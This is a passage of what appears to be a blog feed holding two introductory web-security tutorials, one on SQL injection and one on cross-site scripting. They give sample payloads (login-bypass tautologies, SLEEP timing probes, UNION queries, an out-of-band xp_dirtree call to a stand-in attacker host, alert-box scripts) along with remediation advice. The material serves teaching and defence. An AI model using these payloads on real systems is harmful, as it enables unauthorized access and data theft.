        <content type="html"><![CDATA[<p><img src="/../images/SQLi.webp" alt="alt text"></p><h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><p>SQL injection (SQLi) is a web application injection vulnerability that occurs when an attacker injects malicious SQL statements into an application’s input fields.</p><p>This occurs when a web application does not properly validate user input, allowing an attacker to inject SQL code&#x2F;queries that can manipulate the database or gain access to sensitive information.</p><p>For example, suppose a website has a login form that accepts a username and password. If the website does not properly validate the user’s input, an attacker could enter a malicious SQL statement into the username field that would allow them to bypass the login process and gain access to the website’s database.</p><p>What damage can it do ? </p><p>SQL injection attacks can have serious consequences, including the theft of sensitive data, unauthorized access to sensitive systems, and even full system compromise.</p><h3 id="Types-of-SQL-Injection"><a href="#Types-of-SQL-Injection" class="headerlink" title="Types of SQL Injection:"></a>Types of SQL Injection:</h3><p>SQL injection attacks can manifest in various forms, depending on the specific vulnerability and the attacker’s goals. Some common types of SQL injection include:</p><ol><li><p><code>Classic SQL Injection</code>: In classic SQL injection, attackers insert malicious SQL statements into input fields, such as login forms or search boxes, to manipulate the database. This can involve altering the logic of the original query, extracting sensitive information, or even modifying or deleting database records.</p></li><li><p><code>Blind SQL Injection</code>: In blind SQL injection, attackers exploit vulnerabilities without directly viewing the results of their actions. Instead, they rely on the application’s behavior to infer information indirectly. This can involve techniques like time-based blind injection or boolean-based blind injection.</p></li><li><p><code>Error-based SQL Injection</code>: Error-based SQL injection exploits error messages generated by the database server to extract information about the database structure or the data itself. Attackers inject SQL code that triggers errors revealing details they can exploit.</p></li><li><p><code>Union-based SQL Injection</code>: Union-based SQL injection involves injecting a SELECT statement that includes a UNION operator into an SQL query to combine the results of two queries. This technique can be used to extract data from other tables or even execute arbitrary SQL commands.</p></li><li><p><code>Out-of-Band SQL Injection</code>: Out-of-band SQL injection leverages features of the database server to communicate with the attacker’s server and transmit data. This can be useful when direct retrieval of data is not possible due to network restrictions or other security measures.</p></li><li><p><code>Time-based SQL Injection</code>: Time-based SQL injection involves injecting SQL queries that cause the server to delay its response. Attackers can exploit this delay to infer information indirectly, such as determining whether a certain condition is true or false.</p></li></ol><h3 id="Examples"><a href="#Examples" class="headerlink" title="Examples:"></a>Examples:</h3><h3 id="Classic-SQL-Injection"><a href="#Classic-SQL-Injection" class="headerlink" title="Classic SQL Injection:"></a>Classic SQL Injection:</h3><p>Imagine a login form where users input their username and password. An attacker might input ‘ OR 1&#x3D;1 – in the username field. If the application doesn’t properly sanitize inputs, the SQL query might become:</p><div style="background-color: ##28282B; padding: 10px; border: 1px solid #ccc;">SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'input_password';</div><p>This query always returns true, allowing the attacker to log in without a valid password.</p><h3 id="Blind-SQL-Injection"><a href="#Blind-SQL-Injection" class="headerlink" title="Blind SQL Injection:"></a>Blind SQL Injection:</h3><p>Suppose there’s a login form on a website where users enter their username and password. The website’s login process checks the entered credentials against a database using an SQL query like this:</p><div style="background-color: ##28282B; padding: 10px; border: 1px solid #ccc;">SELECT * FROM users WHERE username = 'input_username' AND password = 'input_password';</div><p>Now, let’s say an attacker wants to bypass the login and gain unauthorized access to the website’s backend. They notice that the website is vulnerable to Blind SQL Injection. Instead of directly viewing the results of their injected SQL queries, the attacker will rely on the application’s behavior to infer information indirectly.</p><p>The attacker inputs the following string into the username field of the login form:</p><div style="background-color: ##28282B; padding: 10px; border: 1px solid #ccc;">' AND SLEEP(10) --'</div><p>If the website takes significantly longer to respond, the attacker infers that the injected condition was true.</p><p>This input modifies the SQL query executed by the application to become:</p><div style="background-color: ##28282B; padding: 10px; border: 1px solid #ccc;">SELECT * FROM users WHERE username = '' OR SLEEP(10) -- ' AND password = 'input_password';</div><h3 id="Error-based-SQL-Injection"><a href="#Error-based-SQL-Injection" class="headerlink" title="Error-based SQL Injection:"></a>Error-based SQL Injection:</h3><p>Consider a website that shows a detailed error message when encountering a database error. An attacker might input:</p><div style="background-color: ##28282B; padding: 10px; border: 1px solid #ccc;">' OR 1=1 UNION SELECT 1, @@VERSION --</div><p>If the application displays database errors, it might reveal the database version, aiding the attacker.</p><h3 id="Union-based-SQL-Injection"><a href="#Union-based-SQL-Injection" class="headerlink" title="Union-based SQL Injection:"></a>Union-based SQL Injection:</h3><p>Suppose there’s a URL parameter id used in a query like:</p><div style="background-color: ##28282B; padding: 10px; border: 1px solid #ccc;">http://example.com/page?id=1 UNION SELECT 1,2,3 --</div><p>If the application concatenates this input into an SQL query without proper validation, it may combine the attacker’s selected columns with the original query’s result.</p><h3 id="Out-of-Band-SQL-Injection"><a href="#Out-of-Band-SQL-Injection" class="headerlink" title="Out-of-Band SQL Injection:"></a>Out-of-Band SQL Injection:</h3><p>If the database server allows outbound connections, an attacker might craft a payload that triggers a DNS lookup or an HTTP request to their controlled server. For example:</p><div style="background-color: ##28282B; padding: 10px; border: 1px solid #ccc;">'; EXEC xp_dirtree '\\attacker.com\share\' --</div><p>This could trigger a connection to the attacker’s server, revealing information or performing actions.</p><h3 id="Time-based-SQL-Injection"><a href="#Time-based-SQL-Injection" class="headerlink" title="Time-based SQL Injection:"></a>Time-based SQL Injection:</h3><p>Similar to blind SQL injection, but instead of inferring information from response times, an attacker uses queries that introduce delays. For instance:</p><div style="background-color: ##28282B; padding: 10px; border: 1px solid #ccc;">' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(10),0) --</div><p>If the delay occurs, the attacker deduces that the condition was true.</p><h3 id="SQLi-Remediation"><a href="#SQLi-Remediation" class="headerlink" title="SQLi Remediation :"></a>SQLi Remediation :</h3><p>Use parameterized queries or prepared statements.</p><p>Validate and sanitize user inputs.</p><p>Limit database user privileges.</p><p>Conduct regular security audits.</p><p>Implement web application firewalls (WAFs).</p><p>Educate developers on secure coding.</p><p>Monitor and log SQL queries.</p><p>Keep software updated.</p><h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>SQL injection (SQLi) remains a critical security threat for web applications, allowing attackers to manipulate databases and compromise sensitive data. Understanding the various types of SQL injection attacks, such as classic, blind, and time-based, is crucial for effective mitigation. Implementing remediation strategies like parameterized queries, input validation, and least privilege principles are essential steps towards bolstering application security. By staying vigilant, educating developers, and regularly auditing code for vulnerabilities, organizations can minimize the risk of SQL injection and safeguard their systems from exploitation.</p>]]></content>

Because XSS is a client side vulnerability, these scripts are executed by the victims browser.</p><p>There are 3 types of Cross-Site Scripting(XSS) attacks :</p><ul><li><p>Reflected XSS</p></li><li><p>Stored XSS</p></li><li><p>DOM-Based XSS</p></li></ul><h1 id="Reflected-XSS"><a href="#Reflected-XSS" class="headerlink" title="Reflected XSS"></a>Reflected XSS</h1><p>Reflected&#x2F;non-persistent cross-site scripting is the most common form of<br>XSS and involves tricking a victim into clicking a specially crafted link (with an XSS payload) to the vulnerable website.</p><p>When the victim clicks on the link the website includes the XSS payload as part of the response back to the victims browser, where the payload is executed.</p><h3 id="Exemple-of-a-Reflected-XSS-attack"><a href="#Exemple-of-a-Reflected-XSS-attack" class="headerlink" title="Exemple of a Reflected XSS attack:"></a>Exemple of a Reflected XSS attack:</h3><p><code>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code></p><p>With this test we can also find out if the Web Application has some kind of filtering or not.</p><p>While this serves as just one among various XSS tests, it remains imperative to conduct thorough assessments for comprehensive security evaluation.</p><h1 id="Stored-XSS"><a href="#Stored-XSS" class="headerlink" title="Stored XSS"></a>Stored XSS</h1><p>Stored&#x2F;persistent cross-site scripting is a vulnerability where an attacker is able to inject Javascript code into a web application’s database or source code via an input that is not sanitised.</p><p>For example, if an attacker is able to inject a malicious XSS payload in to a webpage on a website without proper sanitisation  the XSS payload injected in to the webpage will be executed by the browser of anyone that visits that webpage.</p><h3 id="Example-of-a-Stored-XSS-attack"><a href="#Example-of-a-Stored-XSS-attack" class="headerlink" title="Example of a Stored XSS attack:"></a>Example of a Stored XSS attack:</h3><p>Let’s consider a website that allows users to post comments. The website doesn’t properly sanitize user input, so a malicious user could craft a comment containing JavaScript code. For instance:</p><p><code>&lt;script&gt;alert(&#39;Hello, I am a malicious script!&#39;)&lt;/script&gt;</code></p><p><code>If this comment is stored on the server and not properly sanitized, whenever a user visits the page displaying comments, this script will execute in their browser, showing an alert with the message &quot;Hello, I am a malicious script!&quot;. This is a basic example of a Stored XSS attack where the malicious script is stored on the server and executed whenever the compromised page is accessed.</code></p><h1 id="DOM-Based-XSS"><a href="#DOM-Based-XSS" class="headerlink" title="DOM-Based XSS"></a>DOM-Based XSS</h1><p>DOM-Based XSS&#x2F;type-0 XSS is a type of XSS vulnerability that allows an attacker to inject malicious payloads into a webpage by exploiting a weakness in the DOM of the web application.</p><p>A DOM-Based XSS attack involves exploiting a script on the webpage that takes user input and reflects it back to the page without proper sanitisation, the attacker then injects malicious code&#x2F;payloads into the webpage’s DOM by modifying the values of the script’s variables.</p><h3 id="Example-of-a-DOM-Based-XSS-attack"><a href="#Example-of-a-DOM-Based-XSS-attack" class="headerlink" title="Example of a DOM-Based XSS attack:"></a>Example of a DOM-Based XSS attack:</h3><p>Suppose there’s a website with a search feature that dynamically updates the page based on the user’s input without proper sanitization. A malicious user could manipulate the URL parameters like so:</p><p><a href="https://vulnerable-website.com/search?query=%60">https://vulnerable-website.com/search?query=`</a><script>alert('Hello, I am a malicious script!')</script>&#96;</p><p>In this example, the website’s JavaScript code might retrieve the search query from the URL and directly inject it into the page’s DOM without proper sanitization. As a result, the script included in the URL parameter would execute within the context of the page, displaying an alert box with the message <code>Hello, I am a malicious script!</code> (You’ve see it when you clicked on this post :) ).This illustrates how a DOM-based XSS attack can occur entirely on the client-side, manipulating the DOM environment to execute malicious scripts.</p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>It’s essential for developers and website administrators to implement robust security measures, such as input validation and output encoding, to mitigate the risk of XSS vulnerabilities. By understanding the various forms of XSS attacks and adopting proactive security practices, organizations can better safeguard their web applications and protect users from potential exploitation.</p><hr><h4 id="Thank-you-for-exploring-this-insightful-overview-of-XSS-attacks-Implementing-vigilant-security-measures-is-crucial-in-safeguarding-web-applications-and-ensuring-a-secure-online-environment-for-all-Wishing-you-a-pleasant-and-secure-browsing-experience-Have-a-great-day"><a href="#Thank-you-for-exploring-this-insightful-overview-of-XSS-attacks-Implementing-vigilant-security-measures-is-crucial-in-safeguarding-web-applications-and-ensuring-a-secure-online-environment-for-all-Wishing-you-a-pleasant-and-secure-browsing-experience-Have-a-great-day" class="headerlink" title="Thank you for exploring this insightful overview of XSS attacks.
